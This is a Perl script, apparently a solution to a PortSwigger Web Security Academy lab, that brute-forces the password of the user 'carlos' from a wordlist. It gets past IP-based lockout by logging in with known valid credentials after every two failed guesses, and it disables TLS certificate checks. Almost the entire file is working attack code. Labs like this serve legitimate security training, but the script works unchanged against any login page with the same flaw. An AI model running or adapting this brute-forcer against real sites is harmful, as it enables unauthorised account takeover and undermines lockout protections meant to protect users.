#!/usr/bin/env perl
#
#   Author: <wexe1@protonmail.com>
#   License: MIT
#
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::CookieJar::LWP;
use URI::Encode qw(uri_encode);
use Getopt::Long;
use Pod::Usage;
use feature 'say';
use Term::ANSIColor;

BEGIN {
    say colored("PortSwigger Web Security Academy", "bold yellow");
    say colored("Lab: Broken brute-force protection, IP block", "bold yellow");
    say colored("Solution by weXe1", "bold blue");
    print "\n";
}

our $| = 1;

our(
    $url,
    $proxy,
    $wordlist,
    $help,
);

our $goodCredentials = {
    username => 'wiener',
    password => 'peter'
};

# target user's name
our $targetUsername = 'carlos';

GetOptions(
    'u|url=s'           => \$url,
    'p|proxy=s'         => \$proxy,
    'w|wordlist=s'      => \$wordlist,
    'h|help'            => \$help
);

pod2usage(1) if $help;
pod2usage(1) unless $url;
pod2usage(1) unless $wordlist;

our $ua = LWP::UserAgent->new(
    # cookie_jar  => HTTP::CookieJar::LWP->new(),
    protocols_allowed   => ['http', 'https']
);
$ua->ssl_opts(verify_hostname => 0, SSL_verify_mode => 0x00);

if ($proxy) {
    $ua->proxy('https' => $proxy);
    $ua->proxy('http' => $proxy);
}

open(my $fh, $wordlist) or die colored("[!!] Cannot open file '$wordlist': $!\n");

say colored("[*] Obtaining password length for user '$targetUsername'", "cyan");

my $count = 1;
while (my $pass = <$fh>) {
    chomp($pass);
    $count++;
    if ($count == 3) {
        &makeRequest($goodCredentials->{username}, $goodCredentials->{password});
        $count = 1
    }

    if (&makeRequest($targetUsername, $pass)) {
        say colored("[+] Found: $pass" , "green");
        exit;
    }
}

say colored("[-] Cannot obtain password with provided wordlist", "red");

sub makeRequest {
    my ($username, $password) = @_;
    my $response = $ua->post($url, {username => $username, password => $password});

    if ($response->is_success || $response->status_line =~ /302 found/i) {
        return ($response->decoded_content =~ /incorrect password/ig) ? 0 : 1;
    } else {
        say STDERR colored($response->status_line, "on_red");
        return 0;
    }
}

__END__

=head1 SYNOPSIS

 $ perl broken-brute-force-protection.pl [options]

=head1 OPTIONS

     --url=<URL>                Target URL of the lab (required)
     --wordlist=<FILENAME>      Password wordlist file (required)
     --proxy=<URL>              HTTP or HTTPS proxy URL (optional)
     --help                     Prints this help and exit

=cut